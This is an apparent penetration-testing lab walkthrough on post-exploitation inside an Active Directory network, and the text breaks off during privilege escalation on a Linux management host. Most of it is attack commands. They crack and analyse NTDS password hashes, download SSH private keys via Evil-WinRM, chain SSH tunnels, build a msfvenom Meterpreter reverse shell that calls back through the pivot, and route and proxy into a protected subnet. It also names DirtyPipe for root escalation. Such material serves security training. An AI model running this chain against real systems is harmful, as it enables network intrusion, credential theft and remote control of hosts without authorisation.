# Post-Exploitation

## 🎯 Overview

**Post-Exploitation** activities **maximize assessment value** after achieving Domain Administrator access. Perform **domain password analysis**, establish **double pivoting** for protected networks, exploit **kernel vulnerabilities**, and demonstrate **comprehensive impact** through systematic post-compromise enumeration and additional security assessments.

## 📊 Domain Password Analysis

### 💎 NTDS Database Analysis
```bash
# Complete credential extraction results:
- Total password hashes obtained: [COUNT]
- Password hashes successfully cracked: [COUNT]  
- Percentage of passwords cracked: [PERCENTAGE]%
- Domain Admin passwords cracked: [COUNT]
- Enterprise Admin passwords cracked: [COUNT]

# DPAT analysis tool usage:
python dpat.py -n ntds_hashes.txt -c cracked_passwords.txt
# Output: Comprehensive password statistics and visualizations
```

### 🔍 Password Policy Effectiveness Assessment
```cmd
# Common password patterns discovered:
- Top 10 most common passwords
- Password length distribution analysis
- Keyboard walk patterns (12qwaszx, etc.)
- Seasonal password variations
- Company-specific password themes

# Security recommendations:

- Deploy password blacklisting solutions
- Increase minimum password length requirements
- Implement regular password rotation policies
```

## 🔒 Active Directory Security Audit

## 🌐 Protected Network Access

### 🔍 Management Network Discovery
```cmd
# Target: 172.16.9.0/23 subnet (management network)
# Goal: Access "crown jewels" servers
# Challenge: Should not be directly accessible from principal domain

# Network topology:
Attack Host → dmz01 (172.16.8.120) → DC01 (172.16.9.3) → MGMT01 (172.16.9.25)
```

### 🗝️ SSH Key Discovery
```bash
# SSH private key location:
C:\Department Shares\IT\Private\Networking\

# Available keys:
ssmallsadm-id_rsa    # Management network access
[other_user]-id_rsa  # Additional network access
[admin_user]-id_rsa  # Privileged access keys

# Key extraction via Evil-WinRM:
download "C:\Department Shares\IT\Private\Networking\ssmallsadm-id_rsa" ./ssmallsadm-key
```

## 🔄 Double Pivot Configuration

### 🛠️ Complex Tunneling Setup
```bash
# Phase 1: SSH Local Port Forwarding (Attack → DMZ01)
ssh -i id_rsa -L 5985:172.16.8.3:5985 root@DMZ01_IP
# Result: Local WinRM access to DC01

# Phase 2: SSH Reverse Port Forwarding (DMZ01 → Attack)  
ssh -i id_rsa -R 1234:ATTACK_IP:8443 root@DMZ01_IP
# Result: Reverse tunnel for DC01 → Attack host communication

# Phase 3: Meterpreter Payload Chain
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.8.120 LPORT=1234 -f exe -o dc_shell.exe
# Target: DMZ01 internal interface, tunneled to attack host
```

### 🎯 Metasploit Routing Configuration
```bash
# Multi/handler setup
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 8443
run

# DC01 payload execution
.\dc_shell.exe
# Result: Meterpreter session through double tunnel

# Route addition for management network
run autoroute -s 172.16.9.0/23
# Result: Direct access to protected subnet

# SOCKS proxy establishment
use auxiliary/server/socks_proxy
set SRVPORT 9050
set VERSION 4a
run
# Result: ProxyChains access to 172.16.9.0/23
```

## 🖥️ MGMT01 Host Compromise

### 🔑 SSH Key Authentication
```bash
# Management network connectivity test
proxychains nmap -sT -p 22 172.16.9.25
# Result: SSH service accessible

# SSH key authentication
chmod 600 ssmallsadm-key
proxychains ssh -i ssmallsadm-key ssmallsadm@172.16.9.25

# Successful access:
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.10.0-051000-generic x86_64)
ssmallsadm@MGMT01:~$
```

### 🔍 System Information Gathering
```bash
# Kernel version analysis
uname -a
# Output: Linux MGMT01 5.10.0-051000-generic #202012132330 SMP

# Vulnerability research:
CVE-2022-0847 (DirtyPipe) - Kernel 5.10.0 vulnerable
# Impact: Local privilege escalation to root

# SUID binary enumeration
